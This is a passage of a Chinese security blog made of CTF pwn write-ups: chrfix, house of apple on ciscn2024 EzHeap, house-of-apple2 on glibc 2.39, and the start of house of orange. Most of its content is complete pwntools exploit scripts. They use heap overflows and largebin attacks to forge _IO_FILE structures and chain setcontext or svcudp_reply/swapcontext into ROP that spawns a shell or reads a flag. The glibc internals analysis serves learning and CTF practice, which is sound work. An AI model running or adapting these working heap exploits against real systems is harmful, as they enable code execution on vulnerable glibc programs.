ELF(&quot;./libc.so.6&quot;)libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)ip = &#x27;&#x27;port = 0local = 1if local:    io = process(banary)else:    io = remote(ip, port)context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)def dbg():    gdb.attach(io)    pause()s = lambda data : io.send(data)sl = lambda data : io.sendline(data)sa = lambda text, data : io.sendafter(text, data)sla = lambda text, data : io.sendlineafter(text, data)r = lambda : io.recv()ru = lambda text : io.recvuntil(text)uu32 = lambda : u32(io.recvuntil(b&quot;\\xff&quot;)[-4:].ljust(4, b&#x27;\\x00&#x27;))uu64 = lambda : u64(io.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;))iuu32 = lambda : int(io.recv(10),16)iuu64 = lambda : int(io.recv(6),16)uheap = lambda : u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))lg = lambda data : io.success(&#x27;%s -&gt; 0x%x&#x27; % (data, eval(data)))ia = lambda : io.interactive()def add(index,lenth=0x400,content=b&#x27;youlin&#x27;):    ru(&quot;Please input:&quot;)    json=b&#x27;&#123;&quot;choice&quot;:&quot;new&quot;,&quot;index&quot;:&#x27;+str(index).encode()+b&#x27;,&quot;length&quot;:&#x27;+str(lenth).encode()+b&#x27;,&quot;message&quot;:&quot;&#x27;+content+b&#x27;&quot;&#125;&#x27;    sl(json)def delete(index,lenth=0x400,content=b&#x27;youlin&#x27;):    ru(&quot;Please input:&quot;)    json=b&#x27;&#123;&quot;choice&quot;:&quot;rm&quot;,&quot;index&quot;:&#x27;+str(index).encode()+b&#x27;,&quot;length&quot;:&#x27;+str(lenth).encode()+b&#x27;,&quot;message&quot;:&quot;&#x27;+content+b&#x27;&quot;&#125;&#x27;    sl(json)def show(index,lenth=0x400,content=b&#x27;youlin&#x27;):    ru(&quot;Please input:&quot;)    json=b&#x27;&#123;&quot;choice&quot;:&quot;view&quot;,&quot;index&quot;:&#x27;+str(index).encode()+b&#x27;,&quot;length&quot;:&#x27;+str(lenth).encode()+b&#x27;,&quot;message&quot;:&quot;&#x27;+content+b&#x27;&quot;&#125;&#x27;    sl(json)def edit(index,content=b&#x27;youlin&#x27;):    ru(&quot;Please input:&quot;)    json=b&#x27;&#123;&quot;choice&quot;:&quot;modify&quot;,&quot;index&quot;:&#x27;+str(index).encode()+b&#x27;,&quot;length&quot;:&#x27;+str(len(content)).encode()+b&#x27;,&quot;message&quot;:&quot;&#x27;+content+b&#x27;&quot;&#125;&#x27;    sl(json)add(0)add(1)add(2,0x100)edit(0,b&#x27;A&#x27;*0x650+b&#x27;B&#x27;*8+b&#x27;\\x71\\x07&#x27;)delete(1)add(3,0x78,b&#x27;&#x27;)edit(3,b&#x27;A&#x27;)show(3)libcbase=uu64()-0x1ecb41lg(&quot;libcbase&quot;)free_hook=libcbase+libc.sym[&#x27;__free_hook&#x27;]system=libcbase+libc.sym[&#x27;system&#x27;]delete(3)edit(3,b&#x27;A&#x27;*0x10)delete(3)edit(3,p64(free_hook)[:6])add(4,0x78,b&#x27;/bin/sh&#x27;)add(5,0x78,p64(system)[:6])delete(4)ia()\n\nchrfix较常规的菜单题，就多了个convert的功能，其他几个功能都没有什么洞，那自然就看convert了\n\n当时断网，还不清楚这里什么功能，但是也能猜到这下面的memcpy应该是能造成堆溢出，然后把n改成一个小一点的数字这里的check就过了\n\nbreak这里在赛后查了一下是什么功能，就是一个中文的转换，然后会造成堆溢出\n后面的攻击就比较常规了，改size覆盖其他堆块，然后泄露出libc改_IO_list_all为堆上的地址，最后打apple2的链子就行了\nfrom pwn import *from ctypes import *from struct import packbanary = &quot;./pwn&quot;elf = ELF(banary)#libc = ELF(&quot;./libc.so.6&quot;)libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)ip = &#x27;&#x27;port = 0local = 1if local:    io = process(banary)else:    io = remote(ip, port)context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)def dbg():    gdb.attach(io)    pause()s = lambda data : io.send(data)sl = lambda data : io.sendline(data)sa = lambda text, data : io.sendafter(text, data)sla = lambda text, data : io.sendlineafter(text, data)r = lambda : io.recv()ru = lambda text : io.recvuntil(text)uu32 = lambda : u32(io.recvuntil(b&quot;\\xff&quot;)[-4:].ljust(4, b&#x27;\\x00&#x27;))uu64 = lambda : u64(io.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;))iuu32 = lambda : int(io.recv(10),16)iuu64 = lambda : int(io.recv(6),16)uheap = lambda : u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))lg = lambda data : io.success(&#x27;%s -&gt; 0x%x&#x27; % (data, eval(data)))ia = lambda : io.interactive()def cmd(choice):    ru(&quot;choice &gt;&gt; &quot;)    sl(str(choice))def add(size,content=b&#x27;youlin&#x27;):    cmd(1)    ru(&quot;size:&quot;)    sl(str(size))    ru(&quot;content:&quot;)    s(content)def delete(index):    cmd(2)    ru(&quot;idx:&quot;)    sl(str(index))def edit(index,content):    cmd(3)    ru(&quot;idx:&quot;)    sl(str(index))    ru(&quot;content:&quot;)    s(content)def show(index):    cmd(4)    ru(&quot;idx:&quot;)    sl(str(index))def convert(index):    cmd(5)    ru(&quot;idx:&quot;)    sl(str(index))for i in range(0x8):    add(0x108)#0-7edit(0,b&#x27;A&#x27;*0x100+&#x27;坤&#x27;.encode(&#x27;UTF-8&#x27;)+b&#x27;\\x51\\x05&#x27;)convert(0)delete(1)for i in range(6):    add(0x210)#8-12show(3)ru(&quot;content:&quot;)libcbase=u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))-0x203b20lg(&quot;libcbase&quot;)one=[0x50a47,0xebc81,0xebc85,0xebc88,0xebce2,0xebd3f,0xebd43]onegadget=libcbase+one[1]l_next=libcbase+0x3fe890rtld_global=libcbase+0x3fd040system=libcbase+libc.sym[&#x27;system&#x27;]bin_sh=libcbase+next(libc.search(b&#x27;/bin/sh\\x00&#x27;))setcontext=libcbase+libc.sym[&#x27;setcontext&#x27;]+61_IO_list_all = libcbase + 0x2044c0ret=libcbase+0x000000000002882fpop_rdi=libcbase+0x000000000010f75bleave_ret=libcbase+0x00000000000299d2swapcontext=libcbase+0x000000000005814Dsvcudp_reply=libcbase+0x000000000017923Done=[0x583dc,0x583e3,0xef4ce,0xef52b]one_gadget=libcbase+one[3]open=libcbase+libc.sym[&#x27;open&#x27;]read=libcbase+libc.sym[&#x27;read&#x27;]write=libcbase+libc.sym[&#x27;write&#x27;]pop_rsi=libcbase+0x0000000000110a4dsyscall_ret=libcbase+0x0000000000098fa6pop_rdx=libcbase+0x00000000001a1034#pop rdx; add rdi, rsi; xor eax, eax; cmp rdx, rsi; cmova rax, rdi; ret;pop_rax=libcbase+0x00000000000dd237add(0x108)#13add(0x108)#14delete(13)delete(14)show(3)ru(&quot;content:&quot;)key=u64(io.recvuntil(b&#x27;\\n&#x27;)[:-1].ljust(8,b&#x27;\\0&#x27;))-1heapbase=key&lt;&lt;12heapbase=heapbase-0x6000lg(&quot;heapbase&quot;)edit(4,p64(_IO_list_all^(key+1)))add(0x108)#15add(0x108,p64(heapbase+0x75e0-0x10))#16fake_heap=heapbase+0x2a10heap1=fake_heap+0x88IO_wfile_jumps = libcbase + 0x202228#_IO_wfile_jumpsadd(0x410)#17lg(&quot;fake_heap&quot;)lg(&quot;heap1&quot;)fake_file = b&#x27;&#x27;fake_file = p64(0)+p64(1)fake_file=  fake_file.ljust(0x28,b&#x27;\\x00&#x27;)+p64(heap1)fake_file = fake_file.ljust(0x68,b&#x27;\\x00&#x27;)+p64(fake_heap)fake_file = fake_file.ljust(0x80,b&#x27;\\x00&#x27;)+p64(fake_heap)fake_file = fake_file.ljust(0xb8,b&#x27;\\x00&#x27;)+p64(IO_wfile_jumps)payload = cyclic(0x10)+fake_fileedit(0,payload)flag_addr=heapbase+0x2d10orw=p64(pop_rax)+p64(2)+p64(pop_rdi)+p64(flag_addr)+p64(pop_rsi)+p64(0)+p64(syscall_ret)orw+=p64(pop_rdx)+p64(0x50)+p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(fake_heap+0x300)+p64(pop_rax)+p64(0)+p64(syscall_ret)orw+=p64(pop_rdx)+p64(0x50)+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(fake_heap+0x300)+p64(pop_rax)+p64(1)+p64(syscall_ret)payload = b&#x27;&#x27;payload = payload.ljust(0x58,b&#x27;\\x00&#x27;)+p64(svcudp_reply)payload = payload.ljust(0xa0,b&#x27;\\x00&#x27;)+p64(fake_heap+0x120-0x28)+p64(ret)payload = payload.ljust(0xc0,b&#x27;\\x00&#x27;)+p64(fake_heap)+p64(0)*3+p64(fake_heap-0x10)+p64(0)payload +=b&#x27;\\x00&#x27;*0x28+p64(fake_heap)payload +=p64(swapcontext)payload = payload.ljust(0x128,b&#x27;\\x00&#x27;)+p64(fake_heap+0x130)+p64(ret)+orwpayload = payload.ljust(0x168,b&#x27;\\x00&#x27;)+p64(fake_heap)payload = payload.ljust(0x300,b&#x27;\\x00&#x27;)+b&#x27;flag\\x00&#x27;edit(15,payload)cmd(6)ia()\n"},{"title":"house_of_apple","url":"/2024/05/20/house-of-apple/","content":"前言打ciscn的时候突然被gitee恶心到了，之前发的博客(一些笔记)都没了，导致做高版本堆题的时候找不到自己之前存的模板，人傻了，然后听其他师傅的打了house of apple，其实之前有学过，可能是太久没碰过了导致忘记了，本文重新记录一下apple的打法和大致原理\n利用条件1.泄露出堆地址以及libc地址\n2.能控制程序执行io操作，包括但不限于:从main函数返回、调用exit函数、通过_malloc_assert触发\n3.能控制_IO_FILE的vtable和_wide_data，一般用largebin attack\n利用原理stdin&#x2F;stdout&#x2F;stderr这三个_IO_FILE结构体使用的是_IO_file_jumps这个vtable，而当需要调用到vtable里面的函数指针时，会使用宏去调用。以_IO_file_overflow调用为例，glibc中调用的代码片段分析如下\n#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH) #define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1) # define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))\n\n其中，IO_validate_vtable函数负责检查vtable的合法性，会判断vtable的地址是不是在一个合法的区间。如果vtable的地址不合法，程序将会异常终止。\n观察struct _IO_wide_data结构体，发现其对应有一个_wide_vtable成员。\nstruct _IO_wide_data&#123;  wchar_t *_IO_read_ptr;    /* Current read pointer */  wchar_t *_IO_read_end;    /* End of get area. */  wchar_t *_IO_read_base;    /* Start of putback+get area. */  wchar_t *_IO_write_base;    /* Start of put area. */  wchar_t *_IO_write_ptr;    /* Current put pointer. */  wchar_t *_IO_write_end;    /* End of put area. */  wchar_t *_IO_buf_base;    /* Start of reserve area. */  wchar_t *_IO_buf_end;        /* End of reserve area. */  /* The following fields are used to support backing up and undo. */  wchar_t *_IO_save_base;    /* Pointer to start of non-current get area. */  wchar_t *_IO_backup_base;    /* Pointer to first valid character of                   backup area */  wchar_t *_IO_save_end;    /* Pointer to end of non-current get area. */    __mbstate_t _IO_state;  __mbstate_t _IO_last_state;  struct _IO_codecvt _codecvt;  wchar_t _shortbuf[1];  const struct _IO_jump_t *_wide_vtable;&#125;;\n\n在调用_wide_vtable虚表里面的函数时，同样是使用宏去调用，仍然以vtable-&gt;_overflow调用为例，所用到的宏依次为：\n#define _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH) #define WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1) #define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS) #define _IO_WIDE_JUMPS(THIS) \\  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable\n\n可以看到，在调用_wide_vtable里面的成员函数指针时，没有关于vtable的合法性检查。\n因此，我们可以劫持IO_FILE的vtable为_IO_wfile_jumps，控制_wide_data为可控的堆地址空间，进而控制_wide_data-&gt;_wide_vtable为可控的堆地址空间。控制程序执行IO流函数调用，最终调用到_IO_Wxxxxx函数即可控制程序的执行流。\n链路分析触发的方式和apple1是一样的 可以通过显示调用的exit 或者是从main函数返回的隐式exit 或者是malloc_assert输出报错信息\n下面是通过exit触发的链\nexit -&gt; fcloseall -&gt; _IO_cleanup -&gt; _IO_flush_all_lockp -&gt; _IO_OVERFLOW\n主要的思想就是劫持IO_list_all为堆地址 从而我们可以伪造io结构体\n这里主要注意的就是两个成员 一个是_wide_data 一个是vtable\n我们先说vtable 这里的思路是将其伪造为_IO_wfile_jumps\n这样触发io时会调用到_IO_wfile_overflow 来看一下这个函数主要的内容\n\n其内部调用了wdoallocbuf函数 这个函数存在一个任意函数调用的点\n\n其索引是通过rax寄存器来的\n而此时的rax值 就是fakeio的0xa0偏移处的wide_data成员\n\n其wide_data处要求是一个结构体指针 wdoallocbuf函数会调用该指针的vtable的overflow函数\n如果我们将其控制为setcontext 就可以实现一段rop 哪怕是开启了沙盒 也是适用的\n伪造分析关键的伪造点就那几个\n1.先要把_IO_list_all利用largebin attack先覆盖成可控地址 用来伪造结构体 下面称fakeio1\n2.控制fakeio1的vtable为_IO_wfile_jumps 从而调用到 _IO_wfile_overflow\n3.控制fakeio1的_wide_date为fakeio2\n4.控制fakeio2的vtable为fakeio3\n5.控制fakeio3的偏移0x68处为setcontext\n需要注意的就是最后的rop链存放的位置不能影响到fakeio的其他成员 导致程序执行流无法顺利执行\n还有就是之所以 不直接更改_wide_data-&gt;vtable-&gt;0x68为system函数 然后设置fakeio首地址处为&#x2F;bin&#x2F;sh 这样破坏了flag成员 无法让程序执行流按预期的执行\n剩下的就参考下面的模板吧\nfakeio1IO_wfile_jumps = libc_addr + 0x2160c0fake_file = b&#x27;&#x27;fake_file = fake_file.ljust(0x20,b&#x27;\\x00&#x27;)+p64(0)+p64(1)fake_file = fake_file.ljust(0xa0,b&#x27;\\x00&#x27;)+p64(chunk5_addr)fake_file = fake_file.ljust(0xd8,b&#x27;\\x00&#x27;)+p64(IO_wfile_jumps)payload = cyclic(0x10)+fake_file\n\nfakeio2payload = b&#x27;&#x27;payload = payload.ljust(0x58,b&#x27;\\x00&#x27;)+p64(setcontext)payload = payload.ljust(0x90,b&#x27;\\x00&#x27;)+p64(chunk5_addr+0xf0)+p64(ret_addr)payload = payload.ljust(0xd0,b&#x27;\\x00&#x27;)+p64(chunk5_addr)+p64(0)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)\n\n例题:ciscn2024-EzHeap一道常规的堆题，开了沙箱\n\n\n漏洞点在edit，有明显的堆溢出\n先构造出largebin，然后泄露出libc地址和堆地址，然后就是套上面的板子打apple就行了(但是好像直接打orw打不通，用syscall就行了)\nfrom pwn import *from ctypes import *from struct import packbanary = &quot;./EzHeap&quot;elf = ELF(banary)libc = ELF(&quot;./libc.so.6&quot;)#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)ip = &#x27;&#x27;port = 0local = 1if local:    io = process(banary)else:    io = remote(ip, port)context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)def dbg():    gdb.attach(io)    pause()s = lambda data : io.send(data)sl = lambda data : io.sendline(data)sa = lambda text, data : io.sendafter(text, data)sla = lambda text, data : io.sendlineafter(text, data)r = lambda : io.recv()ru = lambda text : io.recvuntil(text)uu32 = lambda : u32(io.recvuntil(b&quot;\\xff&quot;)[-4:].ljust(4, b&#x27;\\x00&#x27;))uu64 = lambda : u64(io.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;))iuu32 = lambda : int(io.recv(10),16)iuu64 = lambda : int(io.recv(6),16)uheap = lambda : u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))lg = lambda data : io.success(&#x27;%s -&gt; 0x%x&#x27; % (data, eval(data)))ia = lambda : io.interactive()def cmd(choice):    ru(&quot;choice &gt;&gt; &quot;)    sl(str(choice))def add(size,content):    cmd(1)    ru(&quot;size:&quot;)    sl(str(size))    ru(&quot;content:&quot;)    s(content)def delete(index):    cmd(2)    ru(&quot;idx:&quot;)    sl(str(index))def edit(index,content):    size=len(content)    cmd(3)    ru(&quot;idx:&quot;)    sl(str(index))    ru(&quot;size:&quot;)    sl(str(size))    ru(&quot;content:&quot;)    s(content)def show(index):    cmd(4)    ru(&quot;idx:&quot;)    sl(str(index))add(0x200,b&#x27;/bin/sh\\x00&#x27;)#0add(0x468,b&#x27;youlin&#x27;)#1add(0x228,b&#x27;youlin&#x27;)#2add(0x430,b&#x27;youlin&#x27;)#3delete(1)add(0x470,b&#x27;sbgitee0&#x27;)#1edit(0,b&#x27;A&#x27;*0x200+b&#x27;B&#x27;*0x10)#p64(0)+p64(0x471)show(0)fd=uu64()libcbase=fd-0x21b0e0lg(&quot;fd&quot;)lg(&quot;libcbase&quot;)_IO_list_all = libcbase + libc.sym[&#x27;_IO_list_all&#x27;]lg(&quot;_IO_list_all&quot;)edit(0,b&#x27;A&#x27;*0x200+b&#x27;A&#x27;*0x10+b&#x27;B&#x27;*0x10)show(0)ru(&quot;B&quot;*0x10)heapbase=uheap()-0x2510lg(&quot;heapbase&quot;)edit(0,b&#x27;A&#x27;*0x200+p64(0)+p64(0x471)+p64(fd)*2+p64(heapbase+0x2510)+p64(_IO_list_all-0x20))delete(3)add(0x480,b&#x27;sbgitee&#x27;)#3fake_heap=heapbase+0x2990+0x10lg(&quot;fake_heap&quot;)IO_wfile_jumps = libcbase + 0x2170c0fake_file = b&#x27;&#x27;fake_file = fake_file.ljust(0x20,b&#x27;\\x00&#x27;)+p64(0)+p64(1)fake_file = fake_file.ljust(0xa0,b&#x27;\\x00&#x27;)+p64(fake_heap)fake_file = fake_file.ljust(0xd8,b&#x27;\\x00&#x27;)+p64(IO_wfile_jumps)payload = cyclic(0x10)+fake_fileedit(2,cyclic(0x210)+payload)flag_addr = fake_heap-0x10setcontext = libcbase + libc.sym[&#x27;setcontext&#x27;]+61ret_addr = libcbase + 0x0000000000029139rdi_addr = libcbase + 0x000000000002a3e5rsi_addr = libcbase + 0x000000000002be51rdx_r12_addr = libcbase + 0x000000000011f2e7 open_addr = libcbase + libc.sym[&#x27;open&#x27;]rax_addr = libcbase + next(libc.search(asm(&quot;pop rax;ret&quot;)))read_addr = libcbase + libc.sym[&#x27;read&#x27;]write_addr = libcbase + libc.sym[&#x27;write&#x27;]syscall_addr = read_addr+0x10payload = b&#x27;flag\\x00&#x27;payload = payload.ljust(0x68,b&#x27;\\x00&#x27;)+p64(setcontext)payload = payload.ljust(0xb0,b&#x27;\\x00&#x27;)+p64(fake_heap+0xf0)+p64(ret_addr)payload = payload.ljust(0xd0,b&#x27;\\x00&#x27;)+p64(fake_heap)+p64(0)*3+p64(fake_heap-0x10)+p64(0)payload += p64(rax_addr)+p64(2)+p64(rdi_addr)+p64(flag_addr)+p64(rsi_addr)+p64(0)+p64(syscall_addr)payload += p64(rax_addr)+p64(0)+p64(rdi_addr)+p64(3)+p64(rsi_addr)+p64(fake_heap+0x4000)+p64(rdx_r12_addr)+p64(0x100)*2+p64(syscall_addr)payload += p64(rax_addr)+p64(1)+p64(rdi_addr)+p64(1)+p64(rsi_addr)+p64(fake_heap+0x4000)+p64(rdx_r12_addr)+p64(0x100)*2+p64(syscall_addr)edit(2,payload)dbg()cmd(5)ia()\n\n"},{"title":"基于house-of-apple2的GLIBC2.39利用","url":"/2024/05/30/house-of-apple2-GLIBC2-39/","content":"前言ubuntu更新到24了，感觉得看下glibc最新的利用，防止有师傅出2.39的题目\n感谢REtard师傅在利用上给的两个关键建议\n利用条件泄露libc地址和堆地址\n一次地址任意写(一般是largebin attack)\n可以触发io流\nhouse of apple2利用链触发的方式和2.35并没有什么区别，直接调用exit或者从main函数返回退出，或是malloc_assert输出报错信息都行\nexit触发的链\nexit-&gt;fcloseall-&gt;_IO_cleanup-&gt;_IO_flush_all-&gt;_IO_wfile_overflow-&gt;_IO_wdoallocbuf\n\n\n利用方法就是劫持_IO_list_all为堆地址，从而伪造io结构体\n前面的apple2的伪造感觉没什么说的，和2.35并没有什么太大差别，只需要调试一下看下几个check的点，稍微改一改就行了\n后续利用在2.35的apple2中，是可以直接控制rdx寄存器来打setcontext的，从而可以从容的写rop或者是orw，但是在2.39这里apple2的利用链并不能控制rdx寄存器，所以这里选择的是\nsvcudp_replyswapcontext\n\n\n\n先通过svcudp_reply控制r12寄存器，然后用swapcontext控制rsp，最后ret，就可以让程序执行我们的rop或者orw了\n例题源码:\n//gcc heap.c -o heap#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void * ptr[0x10] = &#123;0&#125;;int ptr_size[0x10] = &#123;0&#125;;void init()&#123;    setbuf(stdin, 0);    setbuf(stdout, 0);    setbuf(stderr, 0);\tputs(&quot;LitCTF2024 heap 2.35&quot;);&#125;void menu()&#123;\tputs(&quot;1. create&quot;);\tputs(&quot;2. delete&quot;);\tputs(&quot;3. show&quot;);\tputs(&quot;4. edit&quot;);\tputs(&quot;5. exit&quot;);\tprintf(&quot;&gt;&gt;&quot;);&#125;int create()&#123;\tint idx = 0, size = 0;\tprintf(&quot;idx? &quot;);\tscanf(&quot;%d&quot;, &amp;idx);\tif(idx &lt; 0 || idx &gt;= 0x10 || ptr[idx])&#123;\t\tputs(&quot;error !&quot;);\t\treturn 0;\t&#125;\tprintf(&quot;size? &quot;);\tscanf(&quot;%d&quot;, &amp;size);\tif(size&lt;0x410 || size &gt;0x1000)\t&#123;\t\tputs(&quot;error !&quot;);\t\treturn 0;\t&#125;\tptr[idx] = malloc(size);\tif(!ptr[idx])&#123;\t\tputs(&quot;malloc error!&quot;);\t\texit(1);\t&#125;\tptr_size[idx] = size;&#125;int delete()&#123;\tint idx = 0;\tprintf(&quot;idx? &quot;);\tscanf(&quot;%d&quot;, &amp;idx);\t\tif(idx &lt; 0 || idx &gt;= 0x10 || !ptr[idx])&#123;\t\tputs(&quot;no such chunk!&quot;);\t\treturn 0;\t&#125;\tfree(ptr[idx]);&#125;int show()&#123;\tint idx = 0;\tprintf(&quot;idx? &quot;);\tscanf(&quot;%d&quot;, &amp;idx);\t\tif(idx &lt; 0 || idx &gt;= 0x10 || !ptr[idx])&#123;\t\tputs(&quot;no such chunk!&quot;);\t\treturn 0;\t&#125;\tprintf(&quot;content : %s\\n&quot;, (char *)ptr[idx]);&#125;int edit()&#123;\tint idx = 0;\tprintf(&quot;idx? &quot;);\tscanf(&quot;%d&quot;, &amp;idx);\t\tif(idx &lt; 0 || idx &gt;= 0x10 || !ptr[idx])&#123;\t\tputs(&quot;no such chunk!&quot;);\t\treturn 0;\t&#125;\tputs(&quot;content : &quot;);\tread(0, (char *)ptr[idx], ptr_size[idx]);&#125;void Exit()&#123;\tfor(int i = 0; i &lt; 0x10; i++)&#123;\t\tif(!ptr[i])&#123;\t\t\tfree(ptr[i]);\t\t\tptr[i] = 0;\t\t\tptr_size[i] = 0;\t\t&#125;\t&#125;\texit(0);&#125;int main()&#123;    init();\tint idx = 0;\twhile(1)&#123;\t\tmenu();\t\tscanf(&quot;%d&quot;, &amp;idx);\t\tswitch(idx)&#123;\t\t\tcase 1:\t\t\t\tcreate();\t\t\t\tbreak;\t\t\tcase 2:\t\t\t\tdelete();\t\t\t\tbreak;\t\t\tcase 3:\t\t\t\tshow();\t\t\t\tbreak;\t\t\tcase 4:\t\t\t\tedit();\t\t\t\tbreak;\t\t\tcase 5:\t\t\t\tExit();\t\t\t\tbreak;\t\t\tdefault:\t\t\t\tputs(&quot;error!&quot;);\t\t\t\tbreak;\t\t&#125;\t&#125;\t\treturn 0;&#125;\n\n题目就是一个简单的堆题，就一个uaf的漏洞，然后只能申请0x410-0x1000大小的堆块\n可以只用一次largebin attack将_IO_list_all写入堆地址完成利用\nexp:\nfrom pwn import *from ctypes import *from struct import packbanary = &quot;./heap&quot;elf = ELF(banary)#libc = ELF(&quot;./libc.so.6&quot;)libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)ip = &#x27;192.168.182.137&#x27;port = 10006local = 1if local:    io = process(banary)else:    io = remote(ip, port)context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)def dbg():    gdb.attach(io)    pause()s = lambda data : io.send(data)sl = lambda data : io.sendline(data)sa = lambda text, data : io.sendafter(text, data)sla = lambda text, data : io.sendlineafter(text, data)r = lambda : io.recv()ru = lambda text : io.recvuntil(text)uu32 = lambda : u32(io.recvuntil(b&quot;\\xff&quot;)[-4:].ljust(4, b&#x27;\\x00&#x27;))uu64 = lambda : u64(io.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;))iuu32 = lambda : int(io.recv(10),16)iuu64 = lambda : int(io.recv(6),16)uheap = lambda : u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))lg = lambda data : io.success(&#x27;%s -&gt; 0x%x&#x27; % (data, eval(data)))ia = lambda : io.interactive()def cmd(choice):    ru(&quot;&gt;&gt;&quot;)    sl(str(choice))def add(index,size):    cmd(1)    ru(&quot;idx? &quot;)    sl(str(index))    ru(&quot;size? &quot;)    sl(str(size))def delete(index):    cmd(2)    ru(&quot;idx? &quot;)    sl(str(index))def show(index):    cmd(3)    ru(&quot;idx? &quot;)    sl(str(index))def edit(index,content):    cmd(4)      ru(&quot;idx? &quot;)    sl(str(index))    ru(&quot;content : &quot;)    s(content)add(0,0x420)add(1,0x18)add(2,0x418)delete(0)add(3,0x460)delete(2)show(0)fd=uu64()libcbase=fd-0x203f10lg(&quot;fd&quot;)lg(&quot;libcbase&quot;)one=[0x50a47,0xebc81,0xebc85,0xebc88,0xebce2,0xebd3f,0xebd43]onegadget=libcbase+one[1]l_next=libcbase+0x3fe890rtld_global=libcbase+0x3fd040system=libcbase+libc.sym[&#x27;system&#x27;]bin_sh=libcbase+next(libc.search(b&#x27;/bin/sh\\x00&#x27;))setcontext=libcbase+libc.sym[&#x27;setcontext&#x27;]+61_IO_list_all = libcbase + libc.sym[&#x27;_IO_list_all&#x27;]ret=libcbase+0x000000000002882fpop_rdi=libcbase+0x000000000010f75bleave_ret=libcbase+0x00000000000299d2swapcontext=libcbase+0x000000000005814Dsvcudp_reply=libcbase+0x000000000017923Done=[0x583dc,0x583e3,0xef4ce,0xef52b]one_gadget=libcbase+one[3]lg(&quot;l_next&quot;)lg(&quot;rtld_global&quot;)edit(0,b&#x27;A&#x27;*0x10)show(0)ru(b&#x27;A&#x27;*0x10)heapbase=uheap()-0x290lg(&quot;heapbase&quot;)edit(0,p64(fd)*2+p64(heapbase+0x290)+p64(_IO_list_all-0x20))add(4,0x490)fake_heap=heapbase+0xb00+0x10heap1=fake_heap+0x88IO_wfile_jumps = libcbase + 0x202228#_IO_wfile_jumpslg(&quot;fake_heap&quot;)lg(&quot;heap1&quot;)fake_file = b&#x27;&#x27;fake_file = p64(0)+p64(1)fake_file=  fake_file.ljust(0x28,b&#x27;\\x00&#x27;)+p64(heap1)fake_file = fake_file.ljust(0x68,b&#x27;\\x00&#x27;)+p64(fake_heap)fake_file = fake_file.ljust(0x80,b&#x27;\\x00&#x27;)+p64(fake_heap)fake_file = fake_file.ljust(0xb8,b&#x27;\\x00&#x27;)+p64(IO_wfile_jumps)payload = cyclic(0x10)+fake_fileedit(2,payload)payload = b&#x27;&#x27;payload = payload.ljust(0x58,b&#x27;\\x00&#x27;)+p64(svcudp_reply)payload = payload.ljust(0xa0,b&#x27;\\x00&#x27;)+p64(fake_heap+0x120-0x28)+p64(ret)payload = payload.ljust(0xc0,b&#x27;\\x00&#x27;)+p64(fake_heap)+p64(0)*3+p64(fake_heap-0x10)+p64(0)payload +=b&#x27;\\x00&#x27;*0x28+p64(fake_heap)payload +=p64(swapcontext)payload = payload.ljust(0x128,b&#x27;\\x00&#x27;)+p64(fake_heap+0x130)+p64(ret)*2+p64(pop_rdi)+p64(bin_sh)+p64(system)payload = payload.ljust(0x168,b&#x27;\\x00&#x27;)+p64(fake_heap)edit(3,payload)dbg()cmd(5)ia()\n\n"},{"title":"house_of_orange","url":"/2024/03/15/house-of-orange/","content":"前言关于orange前面topchunk构造出unsortedbin的利用手法早就已经学了，但是后面io的攻击始终没有接触，刚好最近在出题，于是学了一下\n参考链接:\nhttps://blog.wjhwjhn.com/posts/house-of-orange-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/\nhttps://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-orange/\nhttps://www.cnblogs.com/xshhc/p/17327672.html\n题目特点1.一般libc版本是2.23\n2.题目中并没有free函数\n3.保护全开\n4.堆溢出\n利用过程1.利用topchunk，构造出unsortedbin(即修改topchunk的size然后申请一个比topchunk.size更大的堆块)\n2.泄露出libc和heap的地址\n3.利用unsortedbin attack修改_IO_list_all的地址为main_arena+88\n4.申请出smallbin同时在堆上伪造io(注意这3.4需要在一个步骤进行)\n原理第一部分，利用topchunk来free 先来讲解第一部分，也就是利用topchunk来free从而得到堆地址和libc基址。 